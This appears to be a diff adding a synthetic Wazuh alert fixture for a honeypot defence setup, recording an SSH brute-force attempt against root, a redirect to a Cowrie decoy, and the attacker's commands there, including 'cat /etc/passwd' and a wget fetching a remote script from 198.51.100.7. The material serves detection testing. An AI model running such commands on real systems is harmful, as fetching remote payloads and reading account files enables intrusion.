@@ -1,0 +1,424 @@
+[
+  {
+    "timestamp": "2026-10-20T10:00:01.000+0000",
+    "id": "1792490400.1001",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "5760",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20",
+      "srcport": "51000",
+      "dstuser": "root"
+    },
+    "full_log": "Oct 20 10:00:01 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51000 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:02.000+0000",
+    "id": "1792490400.1002",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "5760",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20",
+      "srcport": "51001",
+      "dstuser": "root"
+    },
+    "full_log": "Oct 20 10:00:02 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51001 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:03.000+0000",
+    "id": "1792490400.1003",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "5760",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20",
+      "srcport": "51002",
+      "dstuser": "root"
+    },
+    "full_log": "Oct 20 10:00:03 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51002 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:04.000+0000",
+    "id": "1792490400.1004",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "5760",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20",
+      "srcport": "51003",
+      "dstuser": "root"
+    },
+    "full_log": "Oct 20 10:00:04 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51003 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:05.000+0000",
+    "id": "1792490400.1005",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "5760",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ],
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20",
+      "srcport": "51004",
+      "dstuser": "root"
+    },
+    "full_log": "Oct 20 10:00:05 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51004 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:06.000+0000",
+    "id": "1792490400.1006",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100100",
+      "level": 10,
+      "description": "CyberShield: SSH brute force from 192.168.56.20, redirecting to decoy",
+      "groups": [
+        "cybershield"
+      ],
+      "mitre": {
+        "id": [
+          "T1110"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.56.20"
+    },
+    "full_log": "Oct 20 10:00:06 victim sshd[2210]: Failed password for root from 192.168.56.20 port 51005 ssh2",
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:12.000+0000",
+    "id": "1792490400.1007",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100001",
+      "level": 8,
+      "description": "Cowrie: login to decoy from 192.168.56.20",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": [
+          "T1110"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "password": "123456"
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.login.success\", \"username\": \"root\", \"password\": \"123456\"}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:15.000+0000",
+    "id": "1792490400.1008",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100002",
+      "level": 6,
+      "description": "Cowrie: command in decoy: uname -a",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": [
+          "T1059"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.command.input",
+      "input": "uname -a"
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.command.input\", \"input\": \"uname -a\"}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:18.000+0000",
+    "id": "1792490400.1009",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100002",
+      "level": 6,
+      "description": "Cowrie: command in decoy: cat /etc/passwd",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": [
+          "T1059"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.command.input",
+      "input": "cat /etc/passwd"
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.command.input\", \"input\": \"cat /etc/passwd\"}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:22.000+0000",
+    "id": "1792490400.1010",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100002",
+      "level": 6,
+      "description": "Cowrie: command in decoy: wget http://198.51.100.7/x.sh",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": [
+          "T1059"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.command.input",
+      "input": "wget http://198.51.100.7/x.sh"
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.command.input\", \"input\": \"wget http://198.51.100.7/x.sh\"}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:23.000+0000",
+    "id": "1792490400.1011",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100003",
+      "level": 10,
+      "description": "Cowrie: download attempt http://198.51.100.7/x.sh",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": [
+          "T1105"
+        ]
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.session.file_download",
+      "url": "http://198.51.100.7/x.sh",
+      "shasum": "0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.session.file_download\", \"url\": \"http://198.51.100.7/x.sh\", \"shasum\": \"0000000000000000000000000000000000000000000000000000000000000000\"}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-10-20T10:00:30.000+0000",
+    "id": "1792490400.1012",
+    "agent": {
+      "id": "001",
+      "name": "victim"
+    },
+    "manager": {
+      "name": "wazuh-server"
+    },
+    "rule": {
+      "id": "100004",
+      "level": 5,
+      "description": "Cowrie: session closed",
+      "groups": [
+        "cowrie"
+      ],
+      "mitre": {
+        "id": []
+      }
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "session": "a1b2c3d4",
+      "src_ip": "192.168.56.20",
+      "eventid": "cowrie.session.closed",
+      "duration_ms": 18000
+    },
+    "full_log": "{\"session\": \"a1b2c3d4\", \"src_ip\": \"192.168.56.20\", \"eventid\": \"cowrie.session.closed\", \"duration_ms\": 18000}",
+    "location": "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
+  }
+]
